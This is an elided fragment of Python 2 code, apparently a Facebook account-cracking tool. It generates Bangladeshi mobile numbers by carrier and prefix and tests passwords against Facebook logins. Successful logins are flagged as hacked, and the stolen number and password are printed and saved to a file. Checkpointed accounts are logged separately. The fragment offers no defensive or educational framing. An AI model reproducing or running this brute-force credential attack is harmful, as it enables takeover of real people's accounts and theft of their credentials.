...
def menu():
    ...
    print logo
    print '[1]  \x1b[1;92mGP'
    print '[2]  \x1b[1;94mRobi'
    print '[3]  \x1b[1;96mAirtel'
    print '[4]  \x1b[1;91mBanglalink'
...
def action():
    ...
    if bch == '':
        ...
        os.system('clear')
        print logo
        print '171,172,173,174,175,176,177,178,131,132,133,134,135,16'
        try:
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[SIAM-HSCKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[SIAM-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;91m                   [Open After 7 Days]\x1b[0m \n'
